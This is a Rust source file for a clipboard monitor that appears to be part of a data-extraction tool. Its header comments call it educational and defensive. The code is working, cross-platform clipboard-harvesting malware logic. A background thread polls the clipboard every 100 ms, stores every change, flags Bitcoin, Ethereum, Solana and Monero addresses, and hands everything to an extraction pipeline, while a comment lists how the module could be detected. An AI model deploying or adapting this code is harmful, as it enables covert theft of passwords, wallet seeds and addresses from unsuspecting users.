//! Clipboard Monitor Module
//!
//! Monitors system clipboard for cryptocurrency addresses.
//! 
//! EDUCATIONAL/DEFENSIVE PURPOSE: Understanding clipboard monitoring
//! helps detect and prevent clipboard hijacking attacks.
//!
//! Platform support:
//! - Windows: GetClipboardData/CF_TEXT
//! - Linux: X11 selection (PRIMARY, CLIPBOARD)
//! - macOS: NSPasteboard
//!
//! ⚠️ DETECTION: This module can be detected by:
//! - Monitoring clipboard access patterns
//! - Checking for unknown processes accessing clipboard
//! - Behavioral analysis (frequent clipboard reads)

use std::sync::{Arc, Mutex};
use std::thread;
use std::time::{Duration, SystemTime, UNIX_EPOCH};

use log::{debug, error, info, warn};

use super::errors::ExtractionError;
use super::types::{DataType, ExtractedData, ExtractionResult, ExtractionTarget};

/// Clipboard entry captured by monitor
#[derive(Debug, Clone)]
pub struct ClipboardEntry {
    /// Content of clipboard
    pub content: String,
    /// Timestamp of capture
    pub timestamp: u64,
    /// Detected type (if any)
    pub detected_type: Option<ClipboardType>,
    /// Original hash (for comparison)
    pub hash: String,
}

/// Type of clipboard content detected
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum ClipboardType {
    BitcoinAddress,
    EthereumAddress,
    SolanaAddress,
    MoneroAddress,
    UnknownText,
}

/// Clipboard monitor state
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum ClipboardMonitorState {
    Stopped,
    Running,
    Paused,
}

/// Configuration for clipboard monitoring
#[derive(Debug, Clone)]
pub struct ClipboardMonitorConfig {
    /// Polling interval in milliseconds
    pub poll_interval_ms: u64,
    /// Enable detection (not replacement - defensive mode)
    pub detect_only: bool,
    /// Log detected addresses
    pub log_detections: bool,
}

impl Default for ClipboardMonitorConfig {
    fn default() -> Self {
        Self {
            poll_interval_ms: 100,
            detect_only: true, // Defensive by default
            log_detections: true,
        }
    }
}

/// Clipboard monitor with pattern detection
pub struct ClipboardMonitor {
    /// Captured entries
    entries: Arc<Mutex<Vec<ClipboardEntry>>>,
    /// Current state
    state: Arc<Mutex<ClipboardMonitorState>>,
    /// Configuration
    config: ClipboardMonitorConfig,
    /// Last known clipboard hash
    last_hash: Arc<Mutex<String>>,
}

impl ClipboardMonitor {
    pub fn new(config: ClipboardMonitorConfig) -> Self {
        Self {
            entries: Arc::new(Mutex::new(Vec::new())),
            state: Arc::new(Mutex::new(ClipboardMonitorState::Stopped)),
            config,
            last_hash: Arc::new(Mutex::new(String::new())),
        }
    }

    /// Start clipboard monitoring in background thread
    pub fn start(&self) -> Result<(), ExtractionError> {
        let mut state = self.state.lock().map_err(|_| {
            ExtractionError::Internal("Failed to acquire lock".to_string())
        })?;

        if *state == ClipboardMonitorState::Running {
            return Err(ExtractionError::Internal("Clipboard monitor already running".to_string()));
        }

        *state = ClipboardMonitorState::Running;

        // Spawn monitoring thread
        let entries_clone = Arc::clone(&self.entries);
        let state_clone = Arc::clone(&self.state);
        let last_hash_clone = Arc::clone(&self.last_hash);
        let config = self.config.clone();

        thread::spawn(move || {
            info!("Clipboard monitor started (defensive mode)");

            while *state_clone.lock().unwrap() == ClipboardMonitorState::Running {
                // Get current clipboard content
                match get_clipboard_content() {
                    Ok(content) => {
                        let hash = compute_hash(&content);
                        let mut last = last_hash_clone.lock().unwrap();

                        // Check if clipboard changed
                        if hash != *last && !content.is_empty() {
                            // Detect content type
                            let detected_type = detect_content_type(&content);

                            if config.log_detections {
                                if let Some(ref ctype) = detected_type {
                                    info!("Clipboard detection: {:?} ({} chars)", ctype, content.len());
                                }
                            }

                            // Store entry
                            let entry = ClipboardEntry {
                                content: content.clone(),
                                timestamp: get_timestamp(),
                                detected_type,
                                hash: hash.clone(),
                            };

                            if let Ok(mut entries) = entries_clone.lock() {
                                entries.push(entry);
                            }

                            *last = hash;
                        }
                    }
                    Err(e) => {
                        debug!("Failed to read clipboard: {}", e);
                    }
                }

                thread::sleep(Duration::from_millis(config.poll_interval_ms));
            }

            info!("Clipboard monitor stopped");
        });

        Ok(())
    }

    /// Stop clipboard monitoring
    pub fn stop(&self) {
        let mut state = self.state.lock().unwrap();
        *state = ClipboardMonitorState::Stopped;
    }

    /// Get captured entries
    pub fn get_entries(&self) -> Vec<ClipboardEntry> {
        self.entries.lock().unwrap().clone()
    }

    /// Extract data (for integration with extraction pipeline)
    pub fn extract(&self) -> ExtractionResult {
        let entries = self.get_entries();

        if entries.is_empty() {
            return ExtractionResult::failure(
                ExtractionTarget::Clipboard,
                "No clipboard entries captured".to_string(),
            );
        }

        let mut data = Vec::new();

        for (i, entry) in entries.iter().enumerate() {
            let mut metadata = std::collections::BTreeMap::new();
            metadata.insert("timestamp".to_string(), entry.timestamp.to_string());
            metadata.insert("hash".to_string(), entry.hash.clone());
            
            if let Some(ref ctype) = entry.detected_type {
                metadata.insert("detected_type".to_string(), format!("{:?}", ctype));
            }

            data.push(ExtractedData {
                target: ExtractionTarget::Clipboard,
                name: format!("clipboard_entry_{}", i),
                data_type: DataType::Text,
                content: entry.content.as_bytes().to_vec(),
                metadata,
            });
        }

        info!("Clipboard extraction: {} entries", entries.len());

        ExtractionResult::success(ExtractionTarget::Clipboard, data)
    }

    /// Get current state
    pub fn state(&self) -> ClipboardMonitorState {
        *self.state.lock().unwrap()
    }

    /// Clear captured entries
    pub fn clear(&self) {
        let mut entries = self.entries.lock().unwrap();
        entries.clear();
    }
}

/// Get clipboard content (cross-platform)
fn get_clipboard_content() -> Result<String, String> {
    #[cfg(target_os = "windows")]
    {
        get_clipboard_windows()
    }

    #[cfg(target_os = "linux")]
    {
        get_clipboard_linux()
    }

    #[cfg(target_os = "macos")]
    {
        get_clipboard_macos()
    }

    #[cfg(not(any(target_os = "windows", target_os = "linux", target_os = "macos")))]
    {
        Err("Clipboard access not supported on this platform".to_string())
    }
}

/// Windows clipboard access
#[cfg(target_os = "windows")]
fn get_clipboard_windows() -> Result<String, String> {
    use winapi::shared::minwindef::HINSTANCE;
    use winapi::shared::winerror::ERROR_SUCCESS;
    use winapi::um::winbase::{GlobalLock, GlobalSize, GlobalUnlock};
    use winapi::um::winuser::{
        CloseClipboard, GetClipboardData, IsClipboardFormatAvailable, OpenClipboard, CF_TEXT,
    };
    use std::ffi::CStr;
    use std::ptr::null_mut;

    unsafe {
        // Open clipboard
        if OpenClipboard(null_mut()) == 0 {
            return Err("Failed to open clipboard".to_string());
        }

        // Check if text is available
        if IsClipboardFormatAvailable(CF_TEXT) == 0 {
            CloseClipboard();
            return Err("No text in clipboard".to_string());
        }

        // Get clipboard data
        let h_data = GetClipboardData(CF_TEXT);
        if h_data.is_null() {
            CloseClipboard();
            return Err("Failed to get clipboard data".to_string());
        }

        // Lock and read
        let c_str = GlobalLock(h_data) as *const i8;
        if c_str.is_null() {
            CloseClipboard();
            return Err("Failed to lock clipboard data".to_string());
        }

        let content = CStr::from_ptr(c_str)
            .to_string_lossy()
            .into_owned();

        GlobalUnlock(h_data);
        CloseClipboard();

        Ok(content)
    }
}

/// Linux clipboard access (X11)
#[cfg(target_os = "linux")]
fn get_clipboard_linux() -> Result<String, String> {
    // Try xclip first
    use std::process::Command;

    match Command::new("xclip").args(["-selection", "clipboard", "-o"]).output() {
        Ok(output) => {
            if output.status.success() {
                return Ok(String::from_utf8_lossy(&output.stdout).to_string());
            }
        }
        Err(_) => {}
    }

    // Try xsel as fallback
    match Command::new("xsel").args(["--clipboard", "--output"]).output() {
        Ok(output) => {
            if output.status.success() {
                return Ok(String::from_utf8_lossy(&output.stdout).to_string());
            }
        }
        Err(_) => {}
    }

    Err("Clipboard tools (xclip/xsel) not available".to_string())
}

/// macOS clipboard access
#[cfg(target_os = "macos")]
fn get_clipboard_macos() -> Result<String, String> {
    use std::process::Command;

    match Command::new("pbpaste").output() {
        Ok(output) => {
            if output.status.success() {
                return Ok(String::from_utf8_lossy(&output.stdout).to_string());
            }
        }
        Err(_) => {}
    }

    Err("pbpaste not available".to_string())
}

/// Detect content type (crypto address detection)
fn detect_content_type(content: &str) -> Option<ClipboardType> {
    let trimmed = content.trim();

    // Bitcoin addresses: 1, 3, or bc1 prefix, 26-35 chars
    if trimmed.starts_with("1") || trimmed.starts_with("3") {
        if trimmed.len() >= 26 && trimmed.len() <= 35 && is_base58(trimmed) {
            return Some(ClipboardType::BitcoinAddress);
        }
    }
    if trimmed.starts_with("bc1") {
        if trimmed.len() >= 42 && trimmed.len() <= 62 {
            return Some(ClipboardType::BitcoinAddress);
        }
    }

    // Ethereum addresses: 0x prefix, 42 chars total, hex
    if trimmed.starts_with("0x") && trimmed.len() == 42 {
        if trimmed[2..].chars().all(|c| c.is_ascii_hexdigit()) {
            return Some(ClipboardType::EthereumAddress);
        }
    }

    // Solana addresses: base58, 32-44 chars
    if trimmed.len() >= 32 && trimmed.len() <= 44 && is_base58(trimmed) {
        return Some(ClipboardType::SolanaAddress);
    }

    // Monero addresses: base58, 95-106 chars
    if trimmed.len() >= 95 && trimmed.len() <= 106 && is_base58(trimmed) {
        return Some(ClipboardType::MoneroAddress);
    }

    Some(ClipboardType::UnknownText)
}

/// Check if string is valid base58
fn is_base58(s: &str) -> bool {
    const BASE58_ALPHABET: &str = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";
    s.chars().all(|c| BASE58_ALPHABET.contains(c))
}

/// Compute simple hash for comparison
fn compute_hash(content: &str) -> String {
    use std::collections::hash_map::DefaultHasher;
    use std::hash::{Hash, Hasher};

    let mut hasher = DefaultHasher::new();
    content.hash(&mut hasher);
    format!("{:x}", hasher.finish())
}

fn get_timestamp() -> u64 {
    SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .map(|d| d.as_secs())
        .unwrap_or(0)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_detect_bitcoin_address() {
        let legacy = "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa";
        assert_eq!(detect_content_type(legacy), Some(ClipboardType::BitcoinAddress));

        let segwit = "bc1qar0srrr7xfkvy5l643lydnw9re59gtzzwf5mdq";
        assert_eq!(detect_content_type(segwit), Some(ClipboardType::BitcoinAddress));
    }

    #[test]
    fn test_detect_ethereum_address() {
        let eth = "0x742d35Cc6634C0532925a3b844Bc9e7595f0bEb5";
        assert_eq!(detect_content_type(eth), Some(ClipboardType::EthereumAddress));
    }

    #[test]
    fn test_detect_unknown_text() {
        let text = "Hello, World!";
        assert_eq!(detect_content_type(text), Some(ClipboardType::UnknownText));
    }

    #[test]
    fn test_is_base58() {
        assert!(is_base58("1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa"));
        assert!(!is_base58("0x742d35Cc6634C0532925a3b844Bc9e7595f0bEb"));
        assert!(!is_base58("Hello@World")); // @ not in base58
    }

    #[test]
    fn test_clipboard_monitor_creation() {
        let config = ClipboardMonitorConfig::default();
        let monitor = ClipboardMonitor::new(config);
        assert_eq!(monitor.state(), ClipboardMonitorState::Stopped);
    }

    #[test]
    fn test_clipboard_monitor_start_stop() {
        let config = ClipboardMonitorConfig::default();
        let monitor = ClipboardMonitor::new(config);

        monitor.start().unwrap();
        assert_eq!(monitor.state(), ClipboardMonitorState::Running);

        monitor.stop();
        // Give thread time to stop
        thread::sleep(Duration::from_millis(50));
        assert_eq!(monitor.state(), ClipboardMonitorState::Stopped);
    }
}
